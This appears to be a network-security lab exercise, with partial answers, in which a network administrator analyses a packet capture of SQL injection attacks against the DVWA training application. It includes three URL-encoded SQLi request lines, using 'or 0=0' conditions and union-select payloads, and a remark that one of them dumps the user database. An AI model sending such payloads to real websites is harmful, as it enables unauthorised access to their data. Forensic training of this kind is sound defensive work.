##Sniffing Web Attacks

**Scenario**

As a Network administrator, it is your job to detect and analyze any potential breaches in your company. Recently, one of your techs noticed what they thought to be an SQL injection attack on the company website. Your technician has saved and handed over to you the pcap file for further analysis. 

### Instructions

- Open the pcap in [http_dvwa_sqlinjection.pcapng](http_dvwa_sqlinjection.pcapng).

- Find the packets containing the SQLi payloads and record the three payloads you found. 
   **Hint**: Use a tool like URL decoder: <https://www.urldecoder.org/>

- Were the attacks successful? Support your conclusion with evidence.


GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit HTTP/1.1

successfully uses an encoded injection to dump user database

GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29&Submit=Submit HTTP/1.1



GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit HTTP/1.1